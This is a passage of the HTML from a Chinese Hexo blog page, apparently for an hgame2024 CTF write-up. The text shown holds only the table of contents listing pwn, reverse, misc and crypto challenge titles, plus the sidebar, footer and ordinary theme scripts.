Courses</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">2.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EzSignIn"><span class="toc-number">2.1.</span> <span class="toc-text">EzSignIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezshellcode"><span class="toc-number">2.2.</span> <span class="toc-text">ezshellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Elden-Random-Challenge"><span class="toc-number">2.3.</span> <span class="toc-text">Elden Random Challenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezfmt-string"><span class="toc-number">2.4.</span> <span class="toc-text">ezfmt string</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Elden-Ring-%E2%85%A0"><span class="toc-number">2.5.</span> <span class="toc-text">Elden Ring Ⅰ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-number">3.</span> <span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezIDA"><span class="toc-number">3.1.</span> <span class="toc-text">ezIDA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezASM"><span class="toc-number">3.2.</span> <span class="toc-text">ezASM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezUPX"><span class="toc-number">3.3.</span> <span class="toc-text">ezUPX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezPYC"><span class="toc-number">3.4.</span> <span class="toc-text">ezPYC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">4.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">4.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SignIn"><span class="toc-number">4.2.</span> <span class="toc-text">SignIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-attack"><span class="toc-number">4.3.</span> <span class="toc-text">simple_attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E8%87%AA%E6%98%9F%E5%B0%98%E7%9A%84%E9%97%AE%E5%80%99"><span class="toc-number">4.4.</span> <span class="toc-text">来自星尘的问候</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%8C%E5%84%BF%E5%B8%8C%E5%84%BF%E5%B8%8C%E5%B0%94"><span class="toc-number">4.5.</span> <span class="toc-text">希儿希儿希尔</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">5.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezRSA"><span class="toc-number">5.1.</span> <span class="toc-text">ezRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezMath"><span class="toc-number">5.2.</span> <span class="toc-text">ezMath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%9B%BE%E7%89%87"><span class="toc-number">5.3.</span> <span class="toc-text">奇怪的图片</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezPRNG"><span class="toc-number">5.4.</span> <span class="toc-text">ezPRNG</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/hgame2024_week1/" title="hgame2024_week1 WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./hgame2024_week1/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hgame2024_week1 WP"/></a><div class="content"><a class="title" href="/hgame2024_week1/" title="hgame2024_week1 WP">hgame2024_week1 WP</a><time datetime="2024-02-06T14:32:57.000Z" title="发表于 2024-02-06 22:32:57">2024-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/BeginCTF/" title="BeginCTF WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./BeginCTF/%E5%B0%81%E9%9D%A2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BeginCTF WP"/></a><div class="content"><a class="title" href="/BeginCTF/" title="BeginCTF WP">BeginCTF WP</a><time datetime="2024-02-06T13:32:57.000Z" title="发表于 2024-02-06 21:32:57">2024-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/RealWorld/" title="RealWorld wp"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./RealWorld/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RealWorld wp"/></a><div class="content"><a class="title" href="/RealWorld/" title="RealWorld wp">RealWorld wp</a><time datetime="2024-01-28T10:22:05.000Z" title="发表于 2024-01-28 18:22:05">2024-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/hello-world/" title="Hello World"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/banner.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/hello-world/" title="Hello World">Hello World</a><time datetime="2024-01-28T09:36:59.789Z" title="发表于 2024-01-28 17:36:59">2024-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%B0%81%E9%9D%A2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php反序列化"/></a><div class="content"><a class="title" href="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化">php反序列化</a><time datetime="2024-01-09T13:22:05.000Z" title="发表于 2024-01-09 21:22:05">2024-01-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/./hgame2024_week1/%E5%B0%81%E9%9D%A2.jpg')"><div id="footer-wrap"><div id="ft"></div><div class="copyright"><span><b>&copy;2023 - 2024</b></span><span><b>&nbsp;&nbsp;By 晨曦</b></span></div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="博客框架为Hexo_v6.3.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Frame-Hexo-blue.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="主题版本Butterfly_v4.3.1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Theme-Butterfly-6513df.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" title="本站采用多线部署，主线路托管于Vercel"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Hosted-Vercel-brightgreen.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://user.51.la/" style="margin-inline:5px" title="本站数据分析得益于51la技术支持"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Analytics-51la-3db1eb.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20226665" style="margin-inline:5px" title="本站已加入萌ICP豪华套餐，萌ICP备20226665号"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/萌ICP备-20226665-fe1384.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://bitiful.dogecast.com/buckets" style="margin-inline:5px" title="本网站经Service Worker分流至缤纷云对象存储"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Bucket-缤纷云-9c62da.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.netdun.net/" style="margin-inline:5px" title="本站使用网盾星球提供CDN加速与防护"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/CDN-网盾星球-fff2cc.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" title="本网站源码由Github提供存储仓库"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Source-Github-d021d6.svg" alt=""/></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://chenxi-api.vercel.app/',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://chenxi-api.vercel.app/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script defer src="/live2d-widget-master/autoload.js"></script><script src="/js/lunar.js"></script><script src="/js/day.js"></script><script type="text/javascript" src="/js/FunnyTitle.js"></script><script type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script data-pjax defer src="https://npm.elemecdn.com/tzy-blog/lib/js/theme/chocolate.js"></script><script src="/js/jquery.js"></script><script type="text/javascript" src="/js/click.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script defer data-pjax src="/js/cat.js"></script><script defer src="/js/runtime.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>